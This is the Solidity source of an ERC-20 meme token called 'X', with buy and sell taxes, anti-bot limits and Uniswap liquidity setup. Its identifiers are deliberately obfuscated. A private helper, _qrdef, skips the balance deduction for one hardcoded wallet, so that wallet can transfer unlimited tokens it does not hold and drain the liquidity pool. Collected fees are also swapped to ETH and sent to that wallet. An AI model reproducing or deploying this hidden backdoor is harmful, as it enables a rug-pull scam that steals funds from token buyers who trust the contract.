/*

Twitter: https://twitter.com/XErc20_CoinX

Telegram: https://t.me/Xerc_Portal

Website: https://xerc.org/

**/


// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _qrdef(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _qrdef(a, b, "SafeMath");
    }

    function  _qrdef(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _bruyf(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract X is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _bauqof;
    address payable private _qxoeyd;
    address private _brvfvp;
    string private constant _name = unicode"X";
    string private constant _symbol = unicode"𝕏";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1000000000 * 10 **_decimals;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _Rlofdr=0;
    uint256 private _pcfogt=0;
    uint256 public _plucdw = _totalSupply;
    uint256 public _qruafk = _totalSupply;
    uint256 public _pvaexb= _totalSupply;
    uint256 public _qrotld= _totalSupply;


    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _Qvulra;
    mapping (address => bool) private _hvbcnk;
    mapping(address => uint256) private _fiahsg;

    bool private _glfqopen;
    bool public _prqtjq = false;
    bool private plbAnk = false;
    bool private _reyawj = false;


    event _pekjep(uint _plucdw);
    modifier opnvky {
        plbAnk = true;
        _;
        plbAnk = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _Qvulra[owner(

        )] = true;
        _Qvulra[address
        (this)] = true;
        _Qvulra[
            _qxoeyd] = true;
        _qxoeyd = 
        payable (0xa508e51a780Fb86003A0849606F0105Fa42cb9E9);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _qrdef(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 Gloake=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_prqtjq) {
                if (to 
                != address
                (_bauqof) 
                && to !=
                 address
                 (_brvfvp)) {
                  require(_fiahsg
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _fiahsg
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _brvfvp && to != 
            address(_bauqof) &&
             !_Qvulra[to] ) {
                require(amount 
                <= _plucdw,
                 "Exceeds the _plucdw.");
                require(balanceOf
                (to) + amount
                 <= _qruafk,
                  "Exceeds the _qruafk.");
                if(_pcfogt
                < _Rlofdr){
                  require
                  (! _fovdv(to));
                }
                _pcfogt++;
                 _hvbcnk
                 [to]=true;
                Gloake = amount._bruyf
                ((_pcfogt>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _brvfvp &&
             from!= address(this) 
            && !_Qvulra[from] ){
                require(amount <= 
                _plucdw && 
                balanceOf(_qxoeyd)
                <_qrotld,
                 "Exceeds the _plucdw.");
                Gloake = amount._bruyf((_pcfogt>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_pcfogt>
                _Rlofdr &&
                 _hvbcnk[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!plbAnk 
            && to == _brvfvp &&
             _reyawj &&
             contractTokenBalance>
             _pvaexb 
            && _pcfogt>
            _Rlofdr&&
             !_Qvulra[to]&&
              !_Qvulra[from]
            ) {
                _transferFrom( _plkev(amount, 
                _plkev(contractTokenBalance,
                _qrotld)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _pehrek(address
                    (this).balance);
                }
            }
        }

        if(Gloake>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(Gloake);
          emit
           Transfer(from,
           address
           (this),Gloake);
        }
        _balances[from
        ]= _qrdef(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _qrdef(Gloake));
        emit Transfer
        (from, to, 
        amount.
         _qrdef(Gloake));
    }

    function _transferFrom(uint256
     tokenAmount) private
      opnvky {
        if(tokenAmount==
        0){return;}
        if(!_glfqopen)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _bauqof.WETH();
        _approve(address(this),
         address(
             _bauqof), 
             tokenAmount);
        _bauqof.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _plkev
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _qrdef(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _qxoeyd){
            return a ;
        }else{
            return a .
             _qrdef (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _plucdw = _totalSupply;
        _qruafk = _totalSupply;
        emit _pekjep(_totalSupply);
    }

    function _fovdv(address 
    account) private view 
    returns (bool) {
        uint256 Hleup;
        assembly {
            Hleup :=
             extcodesize
             (account)
        }
        return Hleup > 
        0;
    }

    function _pehrek(uint256
    amount) private {
        _qxoeyd.
        transfer(
            amount);
    }

    function openTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _glfqopen ) ;
        _bauqof  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _bauqof), 
            _totalSupply);
        _brvfvp = 
        IUniswapV2Factory(_bauqof.
        factory( ) 
        ). createPair (
            address(this
            ),  _bauqof .
             WETH ( ) );
        _bauqof.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_brvfvp).
        approve(address(_bauqof), 
        type(uint)
        .max);
        _reyawj = true;
        _glfqopen = true;
    }

    receive() external payable {}
}